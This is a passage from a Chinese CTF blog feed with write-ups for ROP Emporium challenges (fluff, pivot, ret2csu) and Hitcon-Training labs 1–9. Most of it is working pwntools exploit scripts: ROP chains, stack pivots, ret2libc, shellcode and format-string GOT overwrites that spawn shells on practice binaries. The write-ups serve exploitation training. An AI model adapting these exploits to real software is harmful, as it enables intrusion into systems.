：这里需要注意一下在查gadget的时候，可能会出现找不到想要的gadget，可以加上参数 –depth 20，（20是深度最深的情况了）12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152$ ROPgadget --binary fluff --only &quot;mov|pop|ret|xor|xchg&quot; --depth 20Gadgets information============================================================0x0000000000400713 : mov byte ptr [rip + 0x20096e], 1 ; ret0x000000000040084f : mov dword ptr [rdx], ebx ; pop r13 ; pop r12 ; xor byte ptr [r10], r12b ; ret0x00000000004007ae : mov eax, 0 ; pop rbp ; ret0x0000000000400835 : mov ebp, 0x604060 ; ret0x0000000000400846 : mov ebx, 0x602050 ; ret0x0000000000400827 : mov edi, 0x601050 ; ret0x000000000040083b : mov edi, 0x601050 ; xchg r11, r10 ; pop r15 ; mov r11d, 0x602050 ; ret0x000000000040084e : mov qword ptr [r10], r11 ; pop r13 ; pop r12 ; xor byte ptr [r10], r12b ; ret0x0000000000400845 : mov r11d, 0x602050 ; ret0x0000000000400834 : mov r13d, 0x604060 ; ret0x0000000000400832 : pop r12 ; mov r13d, 0x604060 ; ret0x00000000004008bc : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret0x0000000000400853 : pop r12 ; xor byte ptr [r10], r12b ; ret0x0000000000400851 : pop r13 ; pop r12 ; xor byte ptr [r10], r12b ; ret0x00000000004008be : pop r13 ; pop r14 ; pop r15 ; ret0x0000000000400825 : pop r14 ; mov edi, 0x601050 ; ret0x00000000004008c0 : pop r14 ; pop r15 ; ret0x000000000040082d : pop r14 ; xor r11, r12 ; pop r12 ; mov r13d, 0x604060 ; ret0x000000000040084c : pop r15 ; mov qword ptr [r10], r11 ; pop r13 ; pop r12 ; xor byte ptr [r10], r12b ; ret0x0000000000400843 : pop r15 ; mov r11d, 0x602050 ; ret0x00000000004008c2 : pop r15 ; ret0x0000000000400820 : pop r15 ; xor r11, r11 ; pop r14 ; mov edi, 0x601050 ; ret0x0000000000400712 : pop rbp ; mov byte ptr [rip + 0x20096e], 1 ; ret0x00000000004008bb : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret0x0000000000400852 : pop rbp ; pop r12 ; xor byte ptr [r10], r12b ; ret0x00000000004008bf : pop rbp ; pop r14 ; pop r15 ; ret0x00000000004006b0 : pop rbp ; ret0x00000000004008ba : pop rbx ; pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret0x000000000040084d : pop rdi ; mov qword ptr [r10], r11 ; pop r13 ; pop r12 ; xor byte ptr [r10], r12b ; ret0x0000000000400844 : pop rdi ; mov r11d, 0x602050 ; ret0x00000000004008c3 : pop rdi ; ret0x0000000000400821 : pop rdi ; xor r11, r11 ; pop r14 ; mov edi, 0x601050 ; ret0x0000000000400826 : pop rsi ; mov edi, 0x601050 ; ret0x00000000004008c1 : pop rsi ; pop r15 ; ret0x000000000040082e : pop rsi ; xor r11, r12 ; pop r12 ; mov r13d, 0x604060 ; ret0x0000000000400833 : pop rsp ; mov r13d, 0x604060 ; ret0x00000000004008bd : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret0x0000000000400854 : pop rsp ; xor byte ptr [r10], r12b ; ret0x00000000004005b9 : ret0x0000000000400841 : xchg ebx, edx ; pop r15 ; mov r11d, 0x602050 ; ret0x0000000000400840 : xchg r11, r10 ; pop r15 ; mov r11d, 0x602050 ; ret0x0000000000400855 : xor byte ptr [r10], r12b ; ret0x0000000000400856 : xor byte ptr [rdx], ah ; ret0x0000000000400823 : xor ebx, ebx ; pop r14 ; mov edi, 0x601050 ; ret0x0000000000400830 : xor ebx, esp ; pop r12 ; mov r13d, 0x604060 ; ret0x0000000000400822 : xor r11, r11 ; pop r14 ; mov edi, 0x601050 ; ret0x000000000040082f : xor r11, r12 ; pop r12 ; mov r13d, 0x604060 ; retUnique gadgets found: 47 exp:1234567891011121314151617181920212223242526272829303132333435363738from pwn import *sh = process('./fluff')binsh = "/bin/sh\x00"system_plt = 0x00000000004005E0data_addr = 0x0000000000601050pop_rdi = 0x00000000004008c3#mov r10, r11 ; pop r13 ; pop r12 ; xor r10, r12 ; retgadget1 = 0x000000000040084e#pop r15 ; mov r10, r11 ; pop r13 ; pop r12 ; xor r10, r12 ; retgadget2 = 0x000000000040084c#xor r11, r11 ; pop r14 ; mov edi, 0x601050 ; retgadget3 = 0x0000000000400822#xor r11, r12 ; pop r12 ; mov r13, 0x604060 ; retgadget4 = 0x000000000040082f#xchg r11, r10 ; pop r15 ; mov r11, 0x602050 ; retgadget5 = 0x0000000000400840#pop r12 ; pop r13 ; pop r14 ; pop r15 ; retgadget6 = 0x00000000004008bcpayload = ""payload += 0x20 * "A" + p64(0)#将 data_addr 写入r10payload += p64(gadget6) + p64(data_addr) +p64(3) + p64(4) + p64(5)payload += p64(gadget3) + p64(4)payload += p64(gadget4) + binshpayload += p64(gadget5) + p64(5)#将"/bin/sh\x00" 写入r11payload += p64(gadget6) + binsh +p64(3) + p64(4) + p64(5)payload += p64(gadget3) + p64(4)payload += p64(gadget4) + binsh#data_addr = "/bin/sh\x00"payload += p64(gadget1) + p64(3) + p64(0)payload += p64(pop_rdi) + p64(data_addr) + p64(system_plt)sh.sendline(payload)sh.interactive() pivot这道题有两次输入，第一次输入到堆中，第二次输入到栈中，而且很明显第二次的可溢出大小不够用来构造rop链，所以我们需要将rop链构造在堆中，然后利用栈迁移来执行rop链。题目中也将堆的地址打印了出来 ，降低了不少难度。给出的.so文件有这个函数可以用： 12345void __noreturn ret2win()&#123; system("/bin/cat flag.txt"); exit(0);&#125; 显然我们构造的rop链要能够控制程序跳转到这个函数去执行，这里需要用到计算偏移elf函数中只有foothold_function在.so中也出现，而且也在got表中，所以ret2win的真实地址可以结合foothold_function算出来，这里需要注意的是，需要先将foothold_function函数调用一次，got表中才有foothold_function的真实地址。这里说一下我踩过的坑，偏移有两种算法：1、真实地址-libc地址2、两个licb函数地址相减一开始我用第一种方法算偏移，理论上来说两种方法都没错，但是因为函数需要调用一次后才能在got表中有真实地址，所以直接拿got表中的地址来当真实地址的错的，所以最好使用第二种方法算偏移，然后在构造rop的时候将其中的一个地址调用一次使得got表中有它的真实地址再拿去加偏移就能得到目标函数的真实地址。exp: 1234567891011121314151617181920212223242526272829303132333435363738394041424344from pwn import *sh = process('./pivot32')elf = ELF('./pivot32')libc = ELF('./libpivot32.so')foothold_plt = elf.plt['foothold_function']foothold_got_plt = elf.got['foothold_function']foothold_sym = libc.symbols['foothold_function']ret2win = libc.symbols['ret2win']# offset = int(foothold_got_plt - foothold_sym) 这里就是直接用got表的地址去算偏移，其实是错的，因为foothold_function函数没有调用过，got表中并不是真实地址# offset = int(ret2win - foothold_sym)offset = ret2win - foothold_sym#offset = foothold_sym - ret2win 这里算偏移的时候要注意结果不能为负数 sh.recvuntil("The Old Gods kindly bestow upon you a place to pivot: ")leakaddr = int(sh.recv(10),16) #接收题目打印出来的堆地址print hex(leakaddr) pause()add_eax_ebx = 0x080488c7mov_eax_eax = 0x080488c4pop_eax = 0x080488c0pop_ebx = 0x08048571call_eax = 0x080486a3leave_ret = 0x080486a8payload_1 = ""payload_1 += p32(foothold_plt) #将foothold_function函数调用一次payload_1 += p32(pop_eax)payload_1 += p32(foothold_got_plt) #上面调用了一次这里就是真实地址了payload_1 += p32(mov_eax_eax)payload_1 += p32(pop_ebx)payload_1 += p32(offset)payload_1 += p32(add_eax_ebx)payload_1 += p32(call_eax)sh.sendline(payload_1)payload_2 = ""payload_2 += 0x28 * "A"payload_2 += p32(leakaddr-4) + p32(leave_ret)sh.sendline(payload_2)sh.interactive() 64位exp:1234567891011121314151617181920212223242526272829303132333435363738from pwn import *sh = process('./pivot')elf = ELF('./pivot')so = ELF('./libpivot.so')foothold_plt = elf.plt['foothold_function']foothold_got_plt = elf.got['foothold_function']footold_sym = so.symbols['foothold_function']ret2win_sym = so.symbols['ret2win']offset = ret2win_sym - footold_symsh.recvuntil("The Old Gods kindly bestow upon you a place to pivot: ")addr = int(sh.recv(14),16)print hex(addr)pause()mov_rax_rax = 0x0000000000400b05 add_rax_rbp = 0x0000000000400b09pop_rax = 0x0000000000400b00pop_rbp = 0x0000000000400900pop_rdi = 0x0000000000400b73call_rax = 0x000000000040098e# pop_rsp_r13_r14_r15_ret = 0x0000000000400b6dxchg_rax_rsp = 0x0000000000400b02sh.recvuntil("&gt; ")payload_1 = ""payload_1 += p64(foothold_plt)payload_1 += p64(pop_rax) + p64(foothold_got_plt)payload_1 += p64(mov_rax_rax)payload_1 += p64(pop_rbp) + p64(offset)payload_1 += p64(add_rax_rbp)payload_1 += p64(call_rax)sh.sendline(payload_1)sh.recvuntil("&gt; ")payload_2 = ""payload_2 += 0x28*"A"payload_2 += p64(pop_rax) + p64(addr) + p64(xchg_rax_rsp)# payload_2 += p64(pop_rsp_r13_r14_r15_ret) + p64(addr) + p64(3) + p64(4) + p64(5)sh.sendline(payload_2)sh.interactive() ret2csu先checksec一波，no canry ,no pie 从IDA可以看到程序存在栈溢出漏洞和一个后门函数 但是这个后门函数需要三个参数，a1,a2随意，a3需要为0xdeadcafebabebeef,找一下gadget 并没有如pop rdx , mov rdx的gadget，这个时候，我们可以利用__libc_csu_init中的gadget 可以控制 r15,r14,r13的值 来达到控制 rdx,rsi,rdi的目的，这里因为有一个坑，setvbuf函数在调用的时候会将rdx赋值为0xffffffff,这样的话就不能成功调用ret2win了，所以找一个初始化函数调用一下exp: 12345678910111213141516171819202122232425262728#-*-coding:utf-8-*-from pwn import *p = process('./ret2csu')context.log_level = 'debug'init = 0x600E10 #初始化函数地址rop_1 = 0x400880rop_2 = 0x40089aret2win = 0x4007B1payload = 0x20*'a'payload += p64(0) #rbppayload += p64(rop_2)payload += p64(0) #rbxpayload += p64(1) #rbppayload += p64(init) #r12payload += p64(0) #r13payload += p64(0) #r14payload += p64(0xdeadcafebabebeef) #r15payload += p64(rop_1)payload += p64(0) #add rsp,8可以理解为pop操作，但是没有pop到寄存器，而有丢弃掉payload += p64(0) #rbxpayload += p64(0) #rbppayload += p64(0) #r12payload += p64(0) #r13payload += p64(0) #r14payload += p64(0) #r15payload += p64(ret2win)p.sendline(payload)p.interactive()]]></content>
  </entry>
  <entry>
    <title><![CDATA[Hitcon-Training lab1~lab9]]></title>
    <url>%2F2019%2F04%2F04%2FHitcon-Training%2F</url>
    <content type="text"><![CDATA[lab1方法1：逆向破解，因为题目给了.c文件，里面有key和cipher可以直接用123456key = "Do_you_know_why_my_teammate_Orange_is_so_angry???"cipher = [7, 59, 25, 2, 11, 16, 61, 30, 9, 8, 18, 45, 40, 89, 10, 0, 30, 22, 0, 4, 85, 22, 8, 31, 7, 1, 9, 0, 126, 28, 62, 10, 30, 11, 107, 4, 66, 60, 44, 91, 49, 85, 2, 30, 33, 16, 76, 30, 66]flag = ""for i in range(len(cipher)): flag += chr(cipher[i]^ord(key[i]))print flag 方法2：利用gdb动态调试，可以在已生成password且未输入magic的情况下获得password的值：12345678910111213在0x80486e7处下断点，可以看到ebp - 0x80就是password存放的地方► 0x80486e7 &lt;get_flag+332&gt; lea eax, [ebp - 0x80] 0x80486ea &lt;get_flag+335&gt; push eax 0x80486eb &lt;get_flag+336&gt; push dword ptr [ebp - 0x74] 0x80486ee &lt;get_flag+339&gt; call read@plt &lt;0x8048410&gt;再运行到0x8048712处，可以查看 ebp - 0x80的值 pwndbg&gt; x/wx ($ebp -0x80)0xffffcd08: 0x4f77e43c转成十进制，输入就能得到flagpwndbg&gt; cContinuing.1333257276 CTF&#123;debugger_1s_so_p0werful_1n_dyn4m1c_4n4lySis!&#125;[Inferior 1 (process 7593) exited normally] 方法3：同样利用gdb调试，但是这次不用获取password的值而直接在if跳转前设置eip的值指向flag输出的for 循环即可 lab2checksec 一波，只开了 canary 到IDA里看一波，程序逻辑很简单，就是让你输入一个shellcode然后执行它，但是这里需要注意orw_seccomp函数，里面有个prctl会限制部分syscall的调用，只能通过open ,read , write 到获得flag，不是很懂prctl的第一个参数的数值代表什么，就估且当做是第n个的代号吧,往下数到第22个 既然只能读写，那就不能用system(/bin/cat flag)去获取flag，这里我们需要自己写shellcode：123fp = open("flag",0)read(fp,buf,0x30)write(1,buf,0x30) 首先我们要查到open,read,write三个函数对应的系统调用号和参数应该调入的寄存器：linux syscall 接下来写shellcode：123456789101112131415161718192021fp = open(&quot;flag&quot;,0)push 0 0截断：这个0是必需的，这样才能截断字符串的读取push 0x67616c66 &quot;flag&quot;mov ebx,esp open的第一个参数 &quot;flag&quot;xor ecx,ecx 将ecx清0，做为open的第二个参数mov eax,0x5 open的系统调用号int 0x80 中断，进入系统调用read(fp,buf,0x30) mov ebx,eax 系统调用结束 ，将返回值存入eax，（open的返回值为fp,而fp为read的第一个参数）将ebx赋值为fp，做为read的第一个参数mov ecx,esp 将栈顶传给ecx做为read的第二个参数mov edx,0x30 read的第三个参数0x30xor eax,eax 清空eaxmov eax,0x3 read的系统调用号int 0x80 中断，进入系统调用write(1,buf,0x30)（因为write的第二个参数跟read的一样，所以这里可以不用再传一次）mov ebx,1 write的第1个参数mov edx,0x30 write的第三个参数mov eax,0x4 write的系统调用号int 0x80 中断，进入系统 调用 因为自己踩过坑，这里补充一下0截断，也就是在push “flag”之前 为什么要push 0：字符串在读取的时候总是以\x00作为结束标志，如果不先push 0，那么它会将后面的东西也当做字符串读取进来，这样会导致系统读到的文件名不是”flag”，而是”flag…..”后面还有东西，这样就会找不到flag，这里read的返回值就为-1。 这样，shellcode就写完了，exp如下 ：12345678910111213141516171819202122232425262728293031from pwn import *p = process('./orw.bin')shellcode = '''push 0push 0x67616c66mov ebx,espxor ecx,ecxmov eax,0x5int 0x80mov ebx,eaxmov ecx,espmov edx,0x30xor eax,eaxmov eax,0x3int 0x80mov ebx,1mov edx,0x30mov eax,0x4int 0x80'''print asm(shellcode)pause()p.recvuntil(":")gdb.attach(p,"b *0x08048582")pause()p.sendline(asm(shellcode))pause()p.interactive() lab3这一题很简单，第一次输入写进了bss段，第二次输入用gets函数，所以我们只需要在第一次输入的时候输入shellcode，第二次输入将返回地址覆盖成bss段的地址就行，需要注意的是,s的偏移并不是0x14，而是0x1c，如果 IDA 看不出来可以在gdb下信断点查看 exp:1234567891011from pwn import *p = process('./ret2sc')shellcode_addr = 0x0804A060shellcode = asm(shellcraft.sh())p.recvuntil(":")p.sendline(shellcode)p.recvuntil(":")payload = "A" * 0x1c + p32(0) + p32(shellcode_addr)p.sendline(payload)p.interactive() lab4两次输入，第一次输入一个地址，然后程序打印出地址的内容，这可以想到将puts_got地址输入就可以拿到puts函数的真实，先checksec一波 一道简单的ret2libc，那么接下来思路很简单，第一次输入给puts_got地址，拿到puts函数的真实地址，再得到puts函数的libc地址就可以算出偏移，之后 就可以为所欲为的得到其它函数的真实地址了；先找一下库文件： 接下来解决两个小问题：1、查找 字符串”\bin\sh”2、爆出第二次输入的偏移字符串的查找可以用pwntoolsbinsh_libc = libc.search(&#39;/bin/sh&#39;).next()偏移的获得用cyclic 参数生成一串字符之后 ，在gdb中输入得到一个地址，再用cyclic -l 地址即可得到到ret的偏移： exp:1234567891011121314151617181920212223242526272829303132# -*- coding: utf-8 -*-from pwn import *context.log_level = 'debug'p = process('./ret2lib')elf = ELF('./ret2lib')libc = ELF('/lib/i386-linux-gnu/libc.so.6')puts_got = elf.got['puts']print str(puts_got) #134520860pause()p.sendline(str(puts_got))p.recvuntil(": ")puts_addr = int(p.recv(10),16)print "puts_addr:" + hex(puts_addr)puts_libc = libc.symbols['puts']print "puts_libc:" + hex(puts_libc)system_libc = libc.symbols['system']print "system_libc:" + hex(system_libc)binsh_libc = libc.search('/bin/sh').next() 查找 "/bin/sh" 的地址print "binsh_libc:" + hex(binsh_libc)offset = puts_addr - puts_libc #偏移system_addr = offset + system_libcbinsh_addr = offset + binsh_libc# main = 0x804857Dret= 0xdeadbeef #返回地址随意payload = "A" * 60payload += p32(system_addr) + p32(ret) + p32(binsh_addr)# payload += p32(system_addr) + 'b' * 4 + p32(binsh_addr)# gdb.attach(p,"b *0x0804862F")# pause()p.sendline(payload)p.interactive() lab5先checksec 一波 开启了NX保护，静态链接，溢出的空间也够构造rop链，一看就是return to syscall，但是没有发现system函数，也没有”/bin/sh”，这就需要我们自己写execve(“/bin/sh”)了我的思路是这样：将”/bin/sh”构造在bss段作为execve的参数，然后进入系统调用execve；那么我们先要找到一个可以写到内存的gadget：0x0807b301 : mov dword ptr [eax], edx ; ret,bss段的写入就跟之前的没什么两样，找到gadget：1230x080bae06 : pop eax ; ret0x0806e82a : pop edx ; ret0x0806e850 : pop edx ; pop ecx ; pop ebx ; ret 这里还需要找到 int 0x80 : int 0x80```系统中断调用123456789101112131415161718192021222324252627282930313233343536这里还需要查一下sys_execve函数的系统调用号和参数对应的寄存器：![image.png](https://upload-images.jianshu.io/upload_images/12343640-872bc99fa961056a.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240)接下来就开始构造rop了：exp:```python# -*- coding: utf-8 -*-from pwn import *context.log_level = &apos;debug&apos;p = process(&apos;./simplerop&apos;)elf = ELF(&apos;./simplerop&apos;)bss = 0x080EAF80binsh = &quot;/bin/sh\x00&quot;mov_ineax = 0x0807b301# mov_eax_ecx = 0x080a7a6apop_edx_ecx_ebx = 0x0806e850pop_eax = 0x080bae06pop_ebx = 0x080481c9pop_edx = 0x0806e82aint0x80 = 0x080493e1payload = &quot;A&quot; * 32 #将&quot;/bin/sh\x00&quot;分两次写入bss段payload += p32(pop_eax) + p32(bss)payload += p32(pop_edx) + binsh[0:4]payload += p32(mov_ineax)payload += p32(pop_eax) + p32(bss + 4)payload += p32(pop_edx) + binsh[4:8]payload += p32(mov_ineax)#构造 execve(&quot;/bin/sh\x00&quot;)函数并调用 payload += p32(pop_edx_ecx_ebx) + p32(0) + p32(0) + p32(bss)payload += p32(pop_eax) + p32(0x0b)#中断 ，进入系统调用 payload += p32(int0x80)p.sendline(payload)p.interactive() lab6从IDA我们可以看到，main函数只能调一次，那么就用不了ret2libc了，接下来算出溢出的空间只有20个字节（这里96是被我改过的，原题大小是0x40) checksec： 溢出的空间是不够用来构造rop链的，那么就要用到栈迁移了，思路是：先利用溢出执行一次read函数，把我们接下来要执行的rop链写到bss段去，利用leave将ebp跳转到bss段上去，让程序 当成栈去执行，从而达到栈迁移的目的找到对应的gadget就可以开始写exp了exp: 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748#-*- coding:utf-8 -*-from pwn import *context.log_level = 'debug'p = process('./migration')elf = ELF('./migration')# libc = ELF('/lib/i386-linux-gnu/libc.so.6')libc = elf.libcsystem_libc = libc.symbols['system']print "system_libc :" + hex(system_libc)puts_plt = elf.plt['puts']print "puts_plt :" + hex(puts_plt)puts_got = elf.got['puts']print "puts_got :" + hex(puts_got)puts_libc = libc.symbols['puts']print "puts_libc :" + hex(puts_libc)read_plt = elf.plt['read']print "read_plt :" + hex(read_plt)binsh = libc.search("/bin/sh").next()print "binsh :" + hex(binsh)leave_ret = 0x08048418buf1 = elf.bss() + 0x500buf2 = elf.bss() + 0x400# pop_ebp = 0x0804856bpop_ebx = 0x0804836d#调用 read 函数往 buf1 写入"/bin/sh"（不明白的一点，为什么第一个参数是0,第一个参数不该是指向"/bin/sh"的一个指针吗？）#read的第一个参数为0指的是标准输入流也就是键盘，在脚本里面的键盘就是payload,也就是下一个senndline(payload)就是读入的内容 payload = "A" * 40payload += p32(buf1) + p32(read_plt) + p32(leave_ret) + p32(0) + p32(buf1) + p32(0x100)p.recvuntil(" :\n")# gdb.attach(p)pause()p.send(payload)# pause()#打印出puts的真实地址 ，然后继续调用 read 函数payload = p32(buf2) + p32(puts_plt) + p32(pop_ebx) + p32(puts_got) + p32(read_plt) + p32(leave_ret) + p32(0) + p32(buf2) + p32(0x100)p.send(payload)# pause()#接收打印的puts真实地址 puts_addr = u32(p.recv(4))print "puts_addr :" + hex(puts_addr)#算偏移offset = puts_addr - puts_libcsystem_addr = offset + system_libcbinsh_addr = offset + binshpayload = p32(0) + p32(system_addr) + "bbbb" + p32(binsh_addr)p.send(payload)p.interactive()# 0xf7df9ca0 这里盗来23R3F师傅的一张图来理解栈迁移的过程 lab7先checksec一波，canary开了，不能愉快地栈溢出了 这道题的意思很清楚，password是一个随机数，只要在第二次输入的时候相等那就可以cat 到 flag ，那么我们需要在第二次输入之前就知道password的值，这里我自然而然地想到了用gdb下断查看 password 的值，这种做法虽然在本地可以但是一但远程了就没鸟用；这就用到了格式化字符串首先，我们要泄漏出password的值 ，要先得到格式化字符串的地址在哪，输入一串东西&quot;“AAAA-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p........ %p泄漏出了printf栈里面的东西，找到AAAA的位置，在第十个，也就是说，格式化字符串的栈的第十个位置，接下来我们就可以构造 [地址] + %10$s将password 泄漏出来，然后接下来就简单了。exp:12345678910111213141516171819202122#-*- coding:utf-8 -*-from pwn import *p = process('./crack')#输入"AAAA-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p...."可以爆出格化字符串的偏移为10password = 0x804A048# print p32(password)# pause()payload = p32(password) + "#" + "%10$s" + "#" #输入两个#用作标记p.recvuntil("What your name ? ")p.send(payload)p.recvuntil("#") #当接收到第一个#时开始返回password的内容了，接收r = p.recvuntil("#") #接收到 # 结束# print rprint len(r)pause()print u32(r[:4]) #因为第二个#会被接收，所以要去掉a = u32(r[:4])# print str(a)# pause()p.recvuntil("Your password :")p.send(str(a))p.interactive() lab8拿到题目，先checksec一波 开了canary，跟栈溢出没关系了，放到IDA里很明显可以看到我们只需要修改magic的值为218或者0xFACEB00C就行了，再看这一句printf(&amp;buf);很明显是格式化字符串了。先测试格式化字符串的位置： 偏移为7，接下来修改magic为2181234567891011121314#-*- coding:utf-8 -*-#偏移为7from pwn import *context.log_level = 'debug'p = process('./craxme')#改小magic = 0x0804A038payload = ""payload += p32(magic) + "%0214c" + "%7$n" #218-4 = 214，前面有个地址4位，所以只需再填214个字符payload2 = fmtstr_payload(7,&#123;magic:218&#125;)p.sendline(payload)p.recv()p.interactive() 修改magic为0xFACEB00C12345678910111213141516171819202122232425262728#-*- coding:utf-8 -*-#偏移为7from pwn import *context.log_level = 'debug'p = process('./craxme')magic = 0x0804A038padding1 = 0x10c-16 #因为0c-16&lt;0所以要在前面加一位(这个加了一位1),这样才能将0c读进去padding2 = 0x1b0 - 0x10cpadding3 = 0x1ce - 0x1b0padding4 = 0x1fa - 0x1ceprint padding1print padding2print padding3print padding4pause()payload = ""payload += p32(magic) + p32(magic+1) + p32(magic+2) + p32(magic+3)# payload += padding1*'a' + "%7$n" + padding2*'b' + "%8$n" + padding3*'c' + "%9$n" + padding4*'d' + "%10$n"payload += "%252c%7$hhn" #padding1 252+16 = 10c(以下同理)payload += "%164c%8$hhn" #padding2payload += "%30c%9$hhn" #padding3payload += "%44c%10$hhn" #padding4# payload2 = fmtstr_payload(7,&#123;magic:0xFACEB00C&#125;) #也可以直接调用fmtstr_payload这个函数p.sendline(payload2)# p.sendline(payload)p.recv()p.interactive() 搜索大佬的博客发现还有另外 两种做法：1、修改puts的got表为system(&quot;cat /home/craxme/flag&quot;);的地址，这样到执行puts(&quot;You need be a phd&quot;);时就会直接执行system(&quot;cat /home/craxme/flag&quot;);2、修改puts的got表为read(0, &amp;buf, 0x100u);把printf 的got表改为system的plt表地址，这样就能拿到shell了（我只能说骚啊）1、修改puts的got表为system(&quot;cat /home/craxme/flag&quot;);的地址 12345678910111213#-*-coding:utf-8-*-from pwn import *p = process('./craxme')elf = ELF('./craxme')#将put_got修改为read(0,&amp;buf,0x100)#将printf修改为systemputs_got = elf.got['puts']system_catflag = 0x80485F3#read(0,&amp;buf,0x100)read = 0x80485A1payload = fmtstr_payload(7,&#123;puts_got:system_catflag&#125;)p.sendline(payload)p.interactive() 2、get shell123456789101112131415#-*-coding:utf-8-*-from pwn import *p = process('./craxme')elf = ELF('./craxme')#将put_got修改为read(0,&amp;buf,0x100)#将printf修改为systemputs_got = elf.got['puts']printf_got = elf.got['printf']system_plt = elf.plt['system']#read(0,&amp;buf,0x100)read = 0x80485A1payload = fmtstr_payload(7,&#123;puts_got:read,printf_got:system_plt&#125;)p.sendline(payload)p.sendline('/bin/sh\x00') #这一句可加可不加我也不清楚 为什么 p.interactive() lab9格式化字符串漏洞，不过是有点蛇皮的格式化字符串，学到了不少新姿势 很明显的格式化字符串，但同时也可以发现，我们的输入是写到bss段去的，那就有一个问题了，我们要怎么利用格式化字符串修改got表为system函数的地址，因为这里我们要解决怎么把某个函数的got值放到栈里面去先看一下栈中的情况 可以发现输入放在bss段且固定在esp，但是也发现了几个有用的地址ebp1,fmt7,ebp2,fmt11，他们的格式化字符的偏移分别为6，7，10，11，我们还发现了libc_start_main+247这个真实地址，先泄漏出这个真实地址就可以得到偏移，进而算出其它函数的地址1234506:0018│ ebp 0xffffcd48 —▸ 0xffffcd58 —▸ 0xffffcd68 ◂— 0x007:001c│ 0xffffcd4c —▸ 0x8048584 (play+59) ◂— nop 、、、、、、、、、、、、、、、、、、、、、、、、、、、、、、、、、、、、、、、、、、、、、、、0a:0028│ 0xffffcd58 —▸ 0xffffcd68 ◂— 0x00b:002c│ 0xffffcd5c —▸ 0x80485b1 (main+42) ◂— nop 我们可以看到ebp1是指向ebp2的指针，ebp2指向一个不知名的地址，这样我们就可以得到栈的地址，因此，如果我们使用%n对ebp1进行操作，那么实际上会修改ebp2的内容，所以，如果我们将ebp2修改为指向fmt7，那么就可以对ebp2进行%n操作来修改fmt7的内容，试想，把fmt7的内容修改为printf_got，这样就实现了把got值放到栈里面去了，接下来就可能通过偏移来进行修改，但是又有另一个问题，一次只能修改2个字节，而需要修改的有4 个字节，又因为我们本来就是利用 printf 函数实现修改的，所以只能一次性修改4个字节（如果修改的不是printf函数，因为有个while循环，可以回到再利用printf函数进行第二次修改）。所以我们可以把要修改的高2 个字节放到fmt11去，同时修改两个位置，这样就可以了，那么思路就出来了。1234561、先泄漏出libc_start_main的地址，算出偏移2、利用偏移得到system等函数的地址3、泄漏出栈地址4、利用ebp1指向ebp2的关系修改ebp2指向fmt7，进而修改fmt7为printf_got，修改ebp2指向fmt11，进而修改fmt11为printf_got+25、修改fmt7和fmt11内容为system的地址6、发送&apos;/bin/sh&apos;做为system 的参数执行那可 exp:123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990#-*-coding:utf-8-*-#libc_start_main+247在偏移15处from pwn import *context.log_level = 'debug'p = process('./playfmt')# /lib/i386-linux-gnu/libc-2.23.soelf = ELF('./playfmt')libc = elf.libc p.recv()#泄漏 libc_start_main 的地址 p.sendline('%15$p')libc_start_main = int(p.recv(),16)-247print 'libc_start_main--&gt;' + hex(libc_start_main)# libc_start_main 的libc地址 libc_start_main_libc = libc.symbols['__libc_start_main']print 'libc_start_main_libc--&gt;' + hex(libc_start_main_libc)offset = libc_start_main - libc_start_main_libcprint 'offset--&gt;' + hex(offset)system_addr = offset + libc.symbols['system']print 'system_addr--&gt;' + hex(system_addr)printf_addr = offset + libc.symbols['printf']print 'printf_addr--&gt;' + hex(printf_addr) printf_got = elf.got['printf']print 'printf_got--&gt;' + hex(printf_got)# one_gadget = 0x3ac5c + offset# print 'one_gadget--&gt;' + hex(one_gadget)# 修改 printf_got 为 system_addr# 泄漏 ebp p.sendline('%6$p')ebp2 = int(p.recv(),16) #10ebp1 = ebp2-0x10 #6fmt7 = ebp1+0x4fmt11 = ebp2+0x4print 'ebp1--&gt;' + hex(ebp1)print 'ebp2--&gt;' + hex(ebp2)print 'fmt7--&gt;' + hex(fmt7)print 'fmt11--&gt;' + hex(fmt11)pause()# 先将 ebp2 指向fmt7# gdb.attach(p,"b *0x0804853B")p.sendline('%'+str(fmt7&amp;0xffff)+'c%6$hn')p.recv()# 再将 fmt7 修改为print_gotp.sendline('%'+str(printf_got&amp;0xffff)+'c%10$hn')p.recv()while True: p.send("n0va") sleep(0.1) data = p.recv() if data.find("n0va") != -1: break# 现在要将 fmt11 修改为print_got+2# 先将 ebp2 指向fmt11p.sendline('%'+str(fmt11&amp;0xffff)+'c%6$hn')p.recv()#再将 fmt11 修改为printf_got+2(即printf_got的高4位现在在printf_got+2的低4位的位置)p.sendline('%'+str((printf_got+2)&amp;0xffff)+'c%10$hn')p.recv()while True: p.send("n0va") sleep(0.1) data = p.recv() if data.find("n0va") != -1: break'''这个循环用于保证所有的字节都被输出，因为recv（）一次最多只能接收0x1000个字节，所以要进行多次recv（）才能保证全部字节都输出以便进行下面的操作需要注意的是，要构造一个字符串“n0va”来作标志，返回的大量字符串中如果包含了这个字符串那么说明之前构造的%n写入已经完成'''# --------到这里fmt7放着printf_got(即printf_addr),fmt11放着printf_got+2(即printf_addr的高4位移到了低4位的位置)# 修改printf_got 为sytem_addr (要同时修改fmt7为print_addr的低4位，fmt11为printf_addr的高4位)# 修改printf_got 的低4位payload = '%'+str((system_addr&amp;0xffff)-12)+'c%7$hn' #在调试时发现，在'%...c'之前有3个'n0va'所以要-12才能保证正确定入# 修改printf_got 的高4位payload += '%'+str((system_addr&gt;&gt;16)-(system_addr&amp;0xffff))+'c%11$hn'gdb.attach(p,"b *0x0804853B")p.sendline(payload)p.recv()while True: p.send("n0va") sleep(0.1) data = p.recv() if data.find("n0va") != -1: breakp.sendline('/bin/sh')p.interactive()]]></content>
  </entry>
  <entry>
    <title><![CDATA[hackme.inndy之pwn]]></title>
    <url>%2F2019%2F03%2F28%2Fhackme.inndy%E4%B9%8Bpwn%2F</url>
